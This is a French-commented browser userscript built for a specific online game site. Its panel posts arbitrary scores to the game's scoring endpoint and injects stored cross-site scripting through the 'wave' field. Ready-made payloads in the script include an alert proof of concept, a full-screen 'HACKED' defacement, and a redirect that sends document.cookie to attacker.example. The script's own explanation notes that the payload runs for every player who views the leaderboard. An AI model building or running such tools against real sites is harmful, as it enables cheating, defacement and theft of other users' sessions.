// ==UserScript==
// @name        Panneau Score / Injection — Soi 6 Starship
// @namespace   Violentmonkey Scripts
// @icon
// @version     1.1.0
//
// @match       https://marcbluersky.com/soi_6_starship/*
// @grant       none
//
// @author      Mik
// @description
// ==/UserScript==

(function() {
    'use strict';

    // ── URL de l'action : même chemin relatif que le jeu (../action.php) ──
    const ACTION_URL = new URL('../action.php', location.href).href;

    // ── Exemples d'injection prêts à l'emploi ──
    const EXEMPLES = [
        {
            id: 'ex-alert',
            label: 'Alert (preuve de concept)',
            payload: '</span><img src=x onerror=alert(document.domain)>',
            expl: 'Ferme le <span> « V. » puis injecte une <img> invalide : le navigateur échoue au chargement et exécute alert(document.domain). Preuve qu\u2019un JS s\u2019exécute chez chaque joueur qui consulte le classement du mois.'
        },
        {
            id: 'ex-alert-texte',
            label: 'Alert personnalisée',
            payload: '</span><img src=x onerror=alert("XSS r\u00e9ussi !")>',
            expl: 'M\u00eame principe, avec un message custom : v\u00e9rifie que le code s\u2019ex\u00e9cute bien dans le contexte de la page.'
        },
        {
            id: 'ex-deface',
            label: 'Deface (recouvre la page)',
            payload: '</span><div style="position:fixed;inset:0;background:red;color:white;font-size:44px;z-index:99999;text-align:center;padding-top:30vh">HACKED</div>',
            expl: 'Ferme le <span> et injecte un <div> plein \u00e9cran qui recouvre le jeu/classement : d\u00e9monstration d\u2019une d\u00e9face du site.'
        },
        {
            id: 'ex-cookie',
            label: 'Exfiltrer le cookie',
            payload: '</span><img src=x onerror=document.location="https://attacker.example/?c="+encodeURIComponent(document.cookie)>',
            expl: 'Ferme le <span> puis, via onerror, redirige le navigateur vers un domaine contr\u00f4l\u00e9 en joignant document.cookie. Attention : les cookies httpOnly (souvent PHPSESSID) ne sont pas accessibles en JS.'
        }
    ];

    // ── État du panneau ──
    let collapsed = false;
    let activeTab = 'score';

    // ── Création du panneau ──
    function creerPanneau() {
        if (document.getElementById('soi6-inject-panel')) return;

        const panel = document.createElement('div');
        panel.id = 'soi6-inject-panel';
        panel.style.cssText =
            'position: fixed; top: 70px; right: 0; width: 300px; ' +
            'background: rgba(15, 23, 42, 0.95); color: #e2e8f0; ' +
            'border: 1px solid #334155; border-right: none; border-radius: 8px 0 0 8px; ' +
            'box-shadow: -2px 2px 12px rgba(0, 0, 0, 0.45); ' +
            'font-family: sans-serif; font-size: 13px; z-index: 999999; ' +
            'transition: width 0.18s ease; overflow: hidden;';

        // ── Barre d'en-tête : onglets + repli ──
        const bar = document.createElement('div');
        bar.style.cssText =
            'display: flex; align-items: center; gap: 4px; padding: 6px; ' +
            'background: #0f172a; border-bottom: 1px solid #334155;';

        const tabScore = document.createElement('button');
        tabScore.id = 'soi6-tab-score';
        tabScore.textContent = 'Score';
        tabScore.style.cssText = boutonOnglet();
        tabScore.addEventListener('click', () => activerOnglet('score'));

        const tabInject = document.createElement('button');
        tabInject.id = 'soi6-tab-inject';
        tabInject.textContent = 'Injection';
        tabInject.style.cssText = boutonOnglet();
        tabInject.addEventListener('click', () => activerOnglet('inject'));

        const collapseBtn = document.createElement('button');
        collapseBtn.id = 'soi6-collapse-btn';
        collapseBtn.textContent = '«';
        collapseBtn.title = 'Replier vers la droite pour voir le site';
        collapseBtn.style.cssText = boutonOnglet() + ' margin-left: auto;';
        collapseBtn.addEventListener('click', () => basculerRepli());

        bar.appendChild(tabScore);
        bar.appendChild(tabInject);
        bar.appendChild(collapseBtn);

        // ── Formulaire : score arbitraire ──
        const formScore = document.createElement('div');
        formScore.id = 'soi6-form-score';
        formScore.style.cssText = 'padding: 8px;';

        formScore.appendChild(creerChamp('score', 'Score', 'soi6-score-input', '123456'));
        formScore.appendChild(creerChamp('wave', 'Wave', 'soi6-wave-input', '1'));

        const btnReprendre = creerBouton('soi6-reprendre', 'Reprendre la partie');
        btnReprendre.addEventListener('click', reprendrePartie);

        const btnSendScore = creerBouton('soi6-send-score', 'Envoyer score');
        btnSendScore.addEventListener('click', () => {
            envoyer(
                document.getElementById('soi6-score-input').value,
                document.getElementById('soi6-wave-input').value,
                document.getElementById('soi6-score-status')
            );
        });

        const statusScore = document.createElement('div');
        statusScore.id = 'soi6-score-status';
        statusScore.style.cssText = 'margin-top: 6px; font-size: 12px; min-height: 16px;';

        formScore.appendChild(btnReprendre);
        formScore.appendChild(btnSendScore);
        formScore.appendChild(statusScore);

        // ── Formulaire : injection JS ──
        const formInject = document.createElement('div');
        formInject.id = 'soi6-form-inject';
        formInject.style.cssText = 'padding: 8px; display: none;';

        formInject.appendChild(creerChamp('inject-score', 'Score (payload, optionnel)', 'soi6-inj-score-input', '0'));

        // ── Sélecteur d'exemples ──
        const exWrap = document.createElement('div');
        exWrap.style.cssText = 'margin-bottom: 6px;';

        const exLbl = document.createElement('label');
        exLbl.textContent = 'Exemples : ';
        exLbl.style.cssText = 'display: block; margin-bottom: 2px; color: #94a3b8;';

        const exSelect = document.createElement('select');
        exSelect.id = 'soi6-examples-select';
        exSelect.style.cssText =
            'width: 100%; padding: 4px 6px; background: #0f172a; color: #e2e8f0; ' +
            'border: 1px solid #334155; border-radius: 4px; box-sizing: border-box; font-family: monospace;';

        const placeholderOpt = document.createElement('option');
        placeholderOpt.value = '';
        placeholderOpt.textContent = '— Choisir un exemple —';
        exSelect.appendChild(placeholderOpt);

        EXEMPLES.forEach(ex => {
            const opt = document.createElement('option');
            opt.value = ex.id;
            opt.textContent = ex.label;
            exSelect.appendChild(opt);
        });

        exSelect.addEventListener('change', () => {
            const choix = EXEMPLES.find(ex => ex.id === exSelect.value);
            if (choix) {
                document.getElementById('soi6-inj-wave-input').value = choix.payload;
                document.getElementById('soi6-inj-explain').textContent = choix.expl;
            } else {
                document.getElementById('soi6-inj-explain').textContent =
                    'Saisie personnalisée : aucun exemple sélectionné.';
            }
        });

        exWrap.appendChild(exLbl);
        exWrap.appendChild(exSelect);
        formInject.appendChild(exWrap);

        formInject.appendChild(creerChamp('inject-wave', 'Wave (payload JS)', 'soi6-inj-wave-input', EXEMPLES[0].payload));

        // ── Sous-titre / explication de l'injection ──
        const explain = document.createElement('div');
        explain.id = 'soi6-inj-explain';
        explain.style.cssText =
            'margin-top: 6px; font-size: 11px; color: #94a3b8; min-height: 28px; line-height: 1.4;';
        explain.textContent = EXEMPLES[0].expl;
        formInject.appendChild(explain);

        const btnSendInject = creerBouton('soi6-send-inject', 'Envoyer injection');
        btnSendInject.addEventListener('click', () => {
            envoyer(
                document.getElementById('soi6-inj-score-input').value,
                document.getElementById('soi6-inj-wave-input').value,
                document.getElementById('soi6-inj-status')
            );
        });

        const statusInject = document.createElement('div');
        statusInject.id = 'soi6-inj-status';
        statusInject.style.cssText = 'margin-top: 6px; font-size: 12px; min-height: 16px;';

        formInject.appendChild(btnSendInject);
        formInject.appendChild(statusInject);

        panel.appendChild(bar);
        panel.appendChild(formScore);
        panel.appendChild(formInject);
        document.body.appendChild(panel);

        // ── Remplissage automatique de la wave depuis le score ──
        // (enregistré après appendChild : les inputs sont alors dans le document)
        document.getElementById('soi6-score-input').addEventListener('input', () => {
            const score = parseInt(document.getElementById('soi6-score-input').value, 10);
            if (!Number.isNaN(score) && score >= 0) {
                document.getElementById('soi6-wave-input').value = String(Math.floor(score / 500) + 1);
            }
        });

        // ── Saisie personnalisée : désactive l'exemple sélectionné ──
        document.getElementById('soi6-inj-wave-input').addEventListener('input', () => {
            if (exSelect.value !== '') {
                exSelect.value = '';
                document.getElementById('soi6-inj-explain').textContent =
                    'Saisie personnalisée : aucun exemple sélectionné.';
            }
        });

        activerOnglet('score');
    }

    // ── Petits helpers ──
    function boutonOnglet() {
        return 'padding: 3px 8px; border: 1px solid #475569; border-radius: 4px; ' +
            'background: #1e293b; color: #cbd5e1; cursor: pointer; font-weight: bold;';
    }

    function creerChamp(id, label, inputId, placeholder) {
        const wrap = document.createElement('div');
        wrap.style.cssText = 'margin-bottom: 6px;';

        const lbl = document.createElement('label');
        lbl.textContent = label + ': ';
        lbl.style.cssText = 'display: block; margin-bottom: 2px; color: #94a3b8;';

        const input = document.createElement('input');
        input.id = inputId;
        input.type = 'text';
        input.value = placeholder;
        input.spellcheck = false;
        input.style.cssText =
            'width: 100%; padding: 4px 6px; background: #0f172a; color: #e2e8f0; ' +
            'border: 1px solid #334155; border-radius: 4px; box-sizing: border-box; font-family: monospace;';

        wrap.appendChild(lbl);
        wrap.appendChild(input);
        return wrap;
    }

    function creerBouton(id, texte) {
        const btn = document.createElement('button');
        btn.id = id;
        btn.textContent = texte;
        btn.style.cssText =
            'margin: 2px 4px 0 0; padding: 5px 10px; border: 1px solid #475569; ' +
            'border-radius: 4px; background: #0ea5e9; color: #0f172a; cursor: pointer; font-weight: bold;';
        return btn;
    }

    function activerOnglet(nom) {
        const formScore = document.getElementById('soi6-form-score');
        const formInject = document.getElementById('soi6-form-inject');
        const tabScore = document.getElementById('soi6-tab-score');
        const tabInject = document.getElementById('soi6-tab-inject');

        if (!formScore || !formInject || !tabScore || !tabInject) return;

        const actif = boutonOnglet() + ' background: #0ea5e9; color: #0f172a; border-color: #0ea5e9;';
        const inactif = boutonOnglet();

        activeTab = nom;

        if (nom === 'score') {
            formScore.style.display = '';
            formInject.style.display = 'none';
            tabScore.style.cssText = actif;
            tabInject.style.cssText = inactif;
        } else {
            formScore.style.display = 'none';
            formInject.style.display = '';
            tabScore.style.cssText = inactif;
            tabInject.style.cssText = actif;
        }
    }

    function basculerRepli() {
        const panel = document.getElementById('soi6-inject-panel');
        const collapseBtn = document.getElementById('soi6-collapse-btn');
        const tabScore = document.getElementById('soi6-tab-score');
        const tabInject = document.getElementById('soi6-tab-inject');
        const formScore = document.getElementById('soi6-form-score');
        const formInject = document.getElementById('soi6-form-inject');

        collapsed = !collapsed;

        if (collapsed) {
            panel.style.width = '34px';
            panel.style.boxShadow = '-2px 2px 8px rgba(0,0,0,0.35)';
            tabScore.style.display = 'none';
            tabInject.style.display = 'none';
            formScore.style.display = 'none';
            formInject.style.display = 'none';
            collapseBtn.textContent = '»';
            collapseBtn.title = 'Redéplier vers la gauche pour revoir les formulaires';
        } else {
            panel.style.width = '300px';
            panel.style.boxShadow = '-2px 2px 12px rgba(0,0,0,0.45)';
            tabScore.style.display = '';
            tabInject.style.display = '';
            collapseBtn.textContent = '«';
            collapseBtn.title = 'Replier vers la droite pour voir le site';
            activerOnglet(activeTab);
        }
    }

    // ── Lire la partie en cours depuis le HUD ──
    function reprendrePartie() {
        const hudScore = document.getElementById('hudScore');
        if (!hudScore) return;
        const scoreActuel = parseInt(hudScore.innerText, 10) || 0;
        const waveActuelle = Math.floor(scoreActuel / 500) + 1;
        document.getElementById('soi6-score-input').value = String(scoreActuel);
        document.getElementById('soi6-wave-input').value = String(waveActuelle);
    }

    // ── Envoi : même requête que saveScoreToServer() ──
    function envoyer(score, wave, statusEl) {
        const formData = new URLSearchParams();
        formData.append('action', 'save_score');
        formData.append('score', score);
        formData.append('wave', wave);

        statusEl.textContent = '⏳ Envoi…';

        fetch(ACTION_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: formData.toString()
        })
        .then(async response => {
            const rawText = await response.text();
            console.log('🔍 [soi6] Réponse brute du serveur :', rawText);
            try {
                return JSON.parse(rawText);
            } catch (e) {
                throw new Error('Réponse non JSON : ' + rawText.slice(0, 80));
            }
        })
        .then(data => {
            if (data.success) {
                statusEl.textContent = '✅ Envoyé !';
            } else {
                statusEl.textContent = '⚠️ Refusé : ' + (data.message || '');
            }
        })
        .catch(err => {
            statusEl.textContent = '❌ ' + err.message;
        });
    }

    // ── Démarrage ──
    function demarrer() {
        creerPanneau();
    }

    if (document.body) {
        demarrer();
    } else {
        window.addEventListener('DOMContentLoaded', demarrer);
    }
    setTimeout(demarrer, 500);
})();
